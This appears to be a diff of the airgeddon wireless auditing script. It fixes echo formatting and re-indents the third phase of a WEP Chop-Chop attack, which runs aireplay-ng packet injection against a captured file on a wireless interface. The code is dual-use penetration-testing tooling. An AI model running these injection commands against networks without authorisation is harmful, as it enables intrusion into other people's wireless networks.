@@ -3714,8 +3714,7 @@ function set_wep_key_script() {
 				echo ""
 				echo -e "ASCII: \${wep_ascii_key}"
 				echo -en "${wep_texts[${language},3]}:"
-				echo -en " \${wep_hex_key}"
-				echo ""
+				echo -e " \${wep_hex_key}"
 				echo ""
 				echo "---------------"
 				echo ""
@@ -3955,23 +3954,23 @@ function set_wep_script() {
 					wep_script_processes+=("\${wep_chopchop_phase2_pid}")
 					wep_chopchop_phase=3
 					;;
-					3)
-						wep_chopchop_phase2_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_chopchop_phase2_pid}$" 2> /dev/null)
-						if [[ -z "\${wep_chopchop_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}chopchop.cap" ]]; then
-							kill_tmux_window_by_name "Chop-Chop Attack (2/3)"
-							manage_output "-hold -bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" "Chop-Chop Attack (3/3)"
+				3)
+					wep_chopchop_phase2_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_chopchop_phase2_pid}$" 2> /dev/null)
+					if [[ -z "\${wep_chopchop_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}chopchop.cap" ]]; then
+						kill_tmux_window_by_name "Chop-Chop Attack (2/3)"
+						manage_output "-hold -bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" "Chop-Chop Attack (3/3)"
 
-							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-								get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}"
-								wep_script_processes+=("\${global_process_pid}")
-								global_process_pid=""
-							else
-								wep_script_processes+=("\$!")
-							fi
-
-							wep_chopchop_phase=4
+						if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+							get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}"
+							wep_script_processes+=("\${global_process_pid}")
+							global_process_pid=""
+						else
+							wep_script_processes+=("\$!")
 						fi
-					;;
+
+						wep_chopchop_phase=4
+					fi
+				;;
 			esac
 			write_wep_processes
 		}
